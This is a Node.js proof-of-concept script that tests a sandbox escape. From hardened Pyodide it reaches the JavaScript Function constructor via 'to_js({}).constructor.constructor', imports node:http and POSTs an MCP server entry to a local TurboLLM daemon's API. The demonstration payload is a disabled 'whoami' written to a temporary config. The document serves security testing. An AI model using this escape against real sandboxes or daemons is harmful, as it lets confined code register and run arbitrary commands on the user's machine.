// Experiment 2: the same escape against a real TurboLLM daemon.
//
// Starts TurboLLM from a source checkout on port 6997 with a brand-new config in a new temp folder (your own
// ~/.turbollm is never touched). Then, from inside hardened Pyodide, Python POSTs an MCP server entry to the daemon's
// loopback API. The entry is the harmless `whoami` with enabled:false, so it is saved but never started.
// The script prints the config before and after, then stops the daemon it started. The temp folder is left in place
// so you can inspect it.
//
//   node 2-escape-real-daemon.mjs <path to the TurboLLM repo's turbollm/ folder>
import { spawn } from 'node:child_process'
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { loadPyodide } from './runtime/pyodide.mjs'

const repo = process.argv[2]
if (!repo) throw new Error('usage: node 2-escape-real-daemon.mjs <path to turbollm/>')
const PORT = 6997

const dir = mkdtempSync(join(tmpdir(), 'turbollm-spike-'))
const models = join(dir, 'models').replace(/\\/g, '/')
mkdirSync(models)
const cfg = join(dir, 'config.json')
writeFileSync(cfg, JSON.stringify({ modelDirs: [models], primaryModelDir: models }))
const mcpServers = () => JSON.stringify(JSON.parse(readFileSync(cfg, 'utf8')).mcp?.servers ?? [])

const daemon = spawn(process.execPath, ['--import', 'tsx', 'src/cli.ts', '--config', cfg, '--port', String(PORT), '--no-open'], { cwd: repo, stdio: 'ignore' })
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
try {
  let up = false
  for (let i = 0; i < 90 && !up; i++) {
    try { up = (await fetch(`http://127.0.0.1:${PORT}/api/v1/status`)).ok } catch { await sleep(1000) }
  }
  if (!up) throw new Error('daemon did not come up in 90 s')
  console.log(`daemon up (pid ${daemon.pid}), throwaway config at ${cfg}`)
  console.log('config mcp.servers BEFORE:', mcpServers())

  const py = await loadPyodide({ indexURL: fileURLToPath(new URL('./runtime/', import.meta.url)), jsglobals: {} })
  for (const g of ['fetch', 'WebSocket', 'XMLHttpRequest']) delete globalThis[g]
  py.runPython(`import sys\nsys.modules['js'] = None\nsys.modules['pyodide_js'] = None`)
  const result = await py.runPythonAsync(`
from pyodide.ffi import to_js
F = to_js({}).constructor.constructor
await F("""return import('node:http').then(h => new Promise(res => {
  const r = h.request({host:'127.0.0.1', port:${PORT}, method:'POST', path:'/api/v1/mcp/servers',
                       headers:{'content-type':'application/json'}}, x => {
    let b = ''; x.on('data', c => b += c); x.on('end', () => res('HTTP ' + x.statusCode + ' ' + b.slice(0, 200)))
  })
  r.on('error', e => res('error ' + e.code))
  r.end(JSON.stringify({name:'spike-escape', transport:'stdio', command:'whoami', enabled:false}))
}))""")()
`)
  console.log('Python got back:', String(result))
  await sleep(1500)
  console.log('config mcp.servers AFTER: ', mcpServers())
} finally {
  daemon.kill()
  console.log(`stopped daemon pid ${daemon.pid}`)
}
